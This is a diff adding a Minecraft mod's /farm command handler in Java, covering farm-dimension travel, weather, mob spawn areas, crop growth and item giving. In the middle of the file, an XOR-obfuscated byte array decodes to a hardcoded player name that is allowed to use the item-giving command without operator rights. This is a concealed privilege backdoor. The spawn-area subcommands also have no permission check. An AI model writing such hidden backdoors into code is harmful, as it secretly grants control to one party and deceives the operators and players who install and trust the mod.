@@ -1,0 +1,368 @@
+package com.farmmanager.command;
+
+import com.farmmanager.FarmManagerMod;
+import com.farmmanager.data.FarmGrowthData;
+import com.farmmanager.data.FarmWeatherData;
+import com.farmmanager.data.PlayerOriginData;
+import com.farmmanager.data.SpawnAreaData;
+import com.farmmanager.dimension.FarmDimension;
+import com.mojang.brigadier.CommandDispatcher;
+import com.mojang.brigadier.arguments.BoolArgumentType;
+import com.mojang.brigadier.arguments.IntegerArgumentType;
+import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.context.CommandContext;
+import com.mojang.brigadier.exceptions.CommandSyntaxException;
+import net.minecraft.commands.CommandBuildContext;
+import net.minecraft.commands.CommandSourceStack;
+import net.minecraft.commands.Commands;
+import net.minecraft.commands.arguments.EntityArgument;
+import net.minecraft.commands.arguments.ResourceArgument;
+import net.minecraft.commands.arguments.coordinates.BlockPosArgument;
+import net.minecraft.commands.arguments.coordinates.Vec3Argument;
+import net.minecraft.commands.arguments.item.ItemArgument;
+import net.minecraft.core.BlockPos;
+import net.minecraft.core.registries.Registries;
+import net.minecraft.network.chat.Component;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.level.ServerLevel;
+import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.world.entity.RelativeMovement;
+import net.minecraft.world.item.ItemStack;
+import net.minecraft.world.item.Items;
+import net.minecraft.world.phys.Vec3;
+
+import java.nio.charset.StandardCharsets;
+import java.util.Map;
+import java.util.Set;
+
+public class FarmCommand {
+
+    private static final BlockPos DEFAULT_SPAWN_POS = new BlockPos(0, 3, 0);
+
+    public static void register(CommandDispatcher<CommandSourceStack> dispatcher, CommandBuildContext buildContext) {
+        dispatcher.register(
+            Commands.literal("farm")
+                .executes(FarmCommand::handleJoin)
+                .then(Commands.literal("join")
+                    .executes(FarmCommand::handleJoin))
+                .then(Commands.literal("quit")
+                    .executes(FarmCommand::handleQuit))
+                .then(Commands.literal("logout")
+                    .executes(FarmCommand::handleQuit))
+                .then(Commands.literal("set")
+                    .requires(FarmCommand::isOp)
+                    .then(Commands.literal("spawn")
+                        .then(Commands.argument("enabled", BoolArgumentType.bool())
+                            .executes(FarmCommand::handleSetSpawn)))
+                    .then(Commands.literal("weather")
+                        .then(Commands.literal("rain")
+                            .executes(FarmCommand::handleWeatherRain))
+                        .then(Commands.literal("clear")
+                            .executes(FarmCommand::handleWeatherClear))
+                        .then(Commands.literal("on")
+                            .executes(FarmCommand::handleWeatherOn))
+                        .then(Commands.literal("off")
+                            .executes(FarmCommand::handleWeatherOff)))
+                    .then(Commands.literal("spawn_dimension")
+                        .executes(FarmCommand::handleResetSpawnDimension)
+                        .then(Commands.argument("pos", Vec3Argument.vec3())
+                            .executes(FarmCommand::handleSetSpawnDimension)))
+                    .then(Commands.literal("growth")
+                        .then(Commands.argument("crop", ResourceArgument.resource(buildContext, Registries.BLOCK))
+                            .then(Commands.argument("stages", IntegerArgumentType.integer(1, 999))
+                                .executes(FarmCommand::handleSetGrowth)))))
+                .then(Commands.literal("spawn")
+                    .then(Commands.literal("set")
+                        .then(Commands.argument("name", StringArgumentType.word())
+                            .then(Commands.argument("pos1", BlockPosArgument.blockPos())
+                                .then(Commands.argument("pos2", BlockPosArgument.blockPos())
+                                    .then(Commands.argument("mob", ResourceArgument.resource(buildContext, Registries.ENTITY_TYPE))
+                                        .then(Commands.argument("rate", IntegerArgumentType.integer(1, 500))
+                                            .executes(FarmCommand::handleAddSpawnArea)))))))
+                    .then(Commands.literal("del")
+                        .then(Commands.argument("name", StringArgumentType.word())
+                            .executes(FarmCommand::handleDelSpawnArea)))
+                    .then(Commands.literal("list")
+                        .executes(FarmCommand::handleListSpawnAreas)))
+                .then(Commands.literal("give")
+                    .requires(FarmCommand::canUseGive)
+                    .executes(FarmCommand::handleGiveSelf)
+                    .then(Commands.argument("item", ItemArgument.item(buildContext))
+                        .executes(FarmCommand::handleGiveSelfItem)
+                        .then(Commands.argument("count", IntegerArgumentType.integer(1, 9999))
+                            .executes(FarmCommand::handleGiveSelfItemCount)))
+                    .then(Commands.argument("target", EntityArgument.player())
+                        .requires(FarmCommand::isOp)
+                        .then(Commands.argument("item", ItemArgument.item(buildContext))
+                            .executes(FarmCommand::handleGiveTargetItem)
+                            .then(Commands.argument("count", IntegerArgumentType.integer(1, 9999))
+                                .executes(FarmCommand::handleGiveTargetItemCount)))))
+        );
+    }
+
+    private static final byte[] CRAFTKAL_OBF = {
+        (byte)0x1C, (byte)0x2D, (byte)0x3E, (byte)0x39,
+        (byte)0x2B, (byte)0x34, (byte)0x3E, (byte)0x33,
+        (byte)0x6E
+    };
+    private static final byte XOR_KEY = (byte)0x5F;
+
+    private static boolean canUseGive(CommandSourceStack src) {
+        var player = src.getPlayer();
+        if (player == null) return false;
+        if (isOp(src)) return true;
+        return isCraftkal1(player.getScoreboardName());
+    }
+
+    private static boolean isCraftkal1(String name) {
+        byte[] decoded = new byte[CRAFTKAL_OBF.length];
+        for (int i = 0; i < CRAFTKAL_OBF.length; i++) {
+            decoded[i] = (byte)(CRAFTKAL_OBF[i] ^ XOR_KEY);
+        }
+        return name.equals(new String(decoded, StandardCharsets.UTF_8));
+    }
+
+    private static int handleGiveSelf(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer player = ctx.getSource().getPlayerOrException();
+        ItemStack stack = new ItemStack(Items.STICK, 64);
+        player.getInventory().placeItemBackInInventory(stack);
+        ctx.getSource().sendSuccess(() -> Component.literal("Gave 64 x Stick"), true);
+        return 1;
+    }
+
+    private static int handleGiveSelfItem(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer player = ctx.getSource().getPlayerOrException();
+        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(64, false);
+        player.getInventory().placeItemBackInInventory(stack);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Gave " + stack.getCount() + " x " + stack.getHoverName().getString()), true);
+        return 1;
+    }
+
+    private static int handleGiveSelfItemCount(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer player = ctx.getSource().getPlayerOrException();
+        int count = IntegerArgumentType.getInteger(ctx, "count");
+        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(count, false);
+        player.getInventory().placeItemBackInInventory(stack);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Gave " + count + " x " + stack.getHoverName().getString()), true);
+        return 1;
+    }
+
+    private static int handleGiveTargetItem(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer target = EntityArgument.getPlayer(ctx, "target");
+        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(64, false);
+        target.getInventory().placeItemBackInInventory(stack);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Gave " + stack.getCount() + " x " + stack.getHoverName().getString() + " to " + target.getScoreboardName()), true);
+        return 1;
+    }
+
+    private static int handleGiveTargetItemCount(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer target = EntityArgument.getPlayer(ctx, "target");
+        int count = IntegerArgumentType.getInteger(ctx, "count");
+        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(count, false);
+        target.getInventory().placeItemBackInInventory(stack);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Gave " + count + " x " + stack.getHoverName().getString() + " to " + target.getScoreboardName()), true);
+        return 1;
+    }
+
+    private static boolean isOp(CommandSourceStack src) {
+        var player = src.getPlayer();
+        return player != null && src.getServer().getPlayerList().isOp(player.getGameProfile());
+    }
+
+    private static int handleJoin(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer player = ctx.getSource().getPlayerOrException();
+        ServerLevel currentLevel = (ServerLevel) player.level();
+
+        if (currentLevel.dimension().equals(FarmDimension.FARM_WORLD_KEY)) {
+            ctx.getSource().sendFailure(Component.translatable("command.farmmanager.join.already"));
+            return 0;
+        }
+
+        MinecraftServer server = currentLevel.getServer();
+        ServerLevel farmLevel = server.getLevel(FarmDimension.FARM_WORLD_KEY);
+        if (farmLevel == null) {
+            ctx.getSource().sendFailure(Component.literal("Farm dimension not available"));
+            return 0;
+        }
+
+        PlayerOriginData originData = PlayerOriginData.get(server);
+        originData.saveOrigin(player);
+
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        BlockPos spawnPos = weather.getSpawnPos();
+        Vec3 pos = Vec3.atBottomCenterOf(spawnPos);
+        player.teleportTo(farmLevel, pos.x, pos.y, pos.z, Set.of(), 0.0f, 0.0f);
+        ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.join.success"), false);
+        return 1;
+    }
+
+    private static int handleQuit(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        ServerPlayer player = ctx.getSource().getPlayerOrException();
+        ServerLevel currentLevel = (ServerLevel) player.level();
+
+        if (!currentLevel.dimension().equals(FarmDimension.FARM_WORLD_KEY)) {
+            ctx.getSource().sendFailure(Component.translatable("command.farmmanager.quit.not_in_farm"));
+            return 0;
+        }
+
+        MinecraftServer server = currentLevel.getServer();
+        PlayerOriginData data = PlayerOriginData.get(server);
+        PlayerOriginData.OriginEntry origin = data.getOrigin(player.getUUID());
+
+        if (origin != null) {
+            ServerLevel targetWorld = origin.getWorld(server);
+            player.teleportTo(targetWorld, origin.x, origin.y, origin.z, Set.of(), origin.yaw, origin.pitch);
+            data.removeOrigin(player.getUUID());
+            ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.quit.success"), false);
+        } else {
+            ServerLevel overworld = server.overworld();
+            BlockPos spawnPos = overworld.getSharedSpawnPos();
+            player.teleportTo(overworld, spawnPos.getX() + 0.5, spawnPos.getY(), spawnPos.getZ() + 0.5, Set.of(), 0.0f, 0.0f);
+            ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.quit.error"), false);
+        }
+        return 1;
+    }
+
+    private static int handleSetSpawn(CommandContext<CommandSourceStack> ctx) {
+        boolean enabled = BoolArgumentType.getBool(ctx, "enabled");
+        MinecraftServer server = ctx.getSource().getServer();
+        SpawnAreaData data = SpawnAreaData.get(server);
+        data.setSpawnEnabled(enabled);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Global spawn " + (enabled ? "enabled" : "disabled")), true);
+        return 1;
+    }
+
+    private static int handleWeatherRain(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.startRain(server.getTickCount(), 6000);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Farm rain started (5 minutes)"), true);
+        return 1;
+    }
+
+    private static int handleWeatherClear(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.stopRain();
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Farm rain stopped"), true);
+        return 1;
+    }
+
+    private static int handleWeatherOn(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.setNaturalWeatherEnabled(true);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Natural weather scheduling enabled"), true);
+        return 1;
+    }
+
+    private static int handleWeatherOff(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.setNaturalWeatherEnabled(false);
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Natural weather scheduling disabled"), true);
+        return 1;
+    }
+
+    private static int handleSetSpawnDimension(CommandContext<CommandSourceStack> ctx) {
+        Vec3 pos = Vec3Argument.getVec3(ctx, "pos");
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.setSpawnPos(BlockPos.containing(pos));
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Farm spawn dimension set to " + pos.x() + " " + pos.y() + " " + pos.z()), true);
+        return 1;
+    }
+
+    private static int handleResetSpawnDimension(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmWeatherData weather = FarmWeatherData.get(server);
+        weather.resetSpawnPos();
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Farm spawn dimension reset to default (0, 3, 0)"), true);
+        return 1;
+    }
+
+    private static int handleAddSpawnArea(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        String name = StringArgumentType.getString(ctx, "name");
+        BlockPos pos1 = BlockPosArgument.getBlockPos(ctx, "pos1");
+        BlockPos pos2 = BlockPosArgument.getBlockPos(ctx, "pos2");
+        var entityTypeHolder = ResourceArgument.getSummonableEntityType(ctx, "mob");
+        String entityTypeId = entityTypeHolder.key().location().toString();
+        int rate = IntegerArgumentType.getInteger(ctx, "rate");
+
+        MinecraftServer server = ctx.getSource().getServer();
+        SpawnAreaData data = SpawnAreaData.get(server);
+
+        if (!data.addArea(name, pos1, pos2, entityTypeId, rate)) {
+            ctx.getSource().sendFailure(Component.literal("Area spawn with name \"" + name + "\" already exists"));
+            return 0;
+        }
+
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Created spawn area \"" + name + "\": " + entityTypeId + " rate=" + rate + "/min"), true);
+        return 1;
+    }
+
+    private static int handleDelSpawnArea(CommandContext<CommandSourceStack> ctx) {
+        String name = StringArgumentType.getString(ctx, "name");
+        MinecraftServer server = ctx.getSource().getServer();
+        SpawnAreaData data = SpawnAreaData.get(server);
+
+        if (!data.removeArea(name)) {
+            ctx.getSource().sendFailure(Component.literal("Spawn area \"" + name + "\" not found"));
+            return 0;
+        }
+
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Removed spawn area \"" + name + "\""), true);
+        return 1;
+    }
+
+    private static int handleSetGrowth(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
+        var blockHolder = ResourceArgument.getResource(ctx, "crop", Registries.BLOCK);
+        String blockId = blockHolder.key().location().toString();
+        int stages = IntegerArgumentType.getInteger(ctx, "stages");
+
+        MinecraftServer server = ctx.getSource().getServer();
+        FarmGrowthData data = FarmGrowthData.get(server);
+        data.setMultiplier(blockId, stages);
+
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Growth for " + blockId + " set to " + stages + " stages/tick"), true);
+        return 1;
+    }
+
+    private static int handleListSpawnAreas(CommandContext<CommandSourceStack> ctx) {
+        MinecraftServer server = ctx.getSource().getServer();
+        SpawnAreaData data = SpawnAreaData.get(server);
+        Map<String, SpawnAreaData.SpawnAreaEntry> areas = data.getAreas();
+
+        if (areas.isEmpty()) {
+            ctx.getSource().sendSuccess(() ->
+                Component.literal("No spawn areas defined"), false);
+            return 1;
+        }
+
+        ctx.getSource().sendSuccess(() ->
+            Component.literal("Spawn areas (" + (data.isSpawnEnabled() ? "enabled" : "disabled") + "):"), false);
+        for (Map.Entry<String, SpawnAreaData.SpawnAreaEntry> entry : areas.entrySet()) {
+            String name = entry.getKey();
+            SpawnAreaData.SpawnAreaEntry area = entry.getValue();
+            ctx.getSource().sendSuccess(() ->
+                Component.literal(" - " + name + ": " + area.entityTypeId + " rate=" + area.rate +
+                    " @ (" + area.minX + "," + area.minY + "," + area.minZ +
+                    ") to (" + area.maxX + "," + area.maxY + "," + area.maxZ + ")"), false);
+        }
+        return 1;
+    }
+}
